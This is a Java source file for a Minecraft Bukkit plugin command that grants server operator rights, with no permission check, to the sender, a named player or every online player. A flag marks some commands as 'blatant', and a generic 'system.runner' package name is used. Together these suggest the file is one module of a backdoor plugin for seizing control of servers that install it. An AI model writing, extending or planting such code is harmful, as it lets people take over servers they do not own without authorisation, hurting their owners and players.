
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import me.system.runner.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;


public class OpCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            API.opPlayer(p2);
            p2.sendMessage(Settings.PREFIX("You are now an operator"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (!a2.isOp()) {
                    API.opPlayer(a2);
                }
            }
            p2.sendMessage(Settings.PREFIX("All online players are now operators"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                API.opPlayer(target);
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is now an operator"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

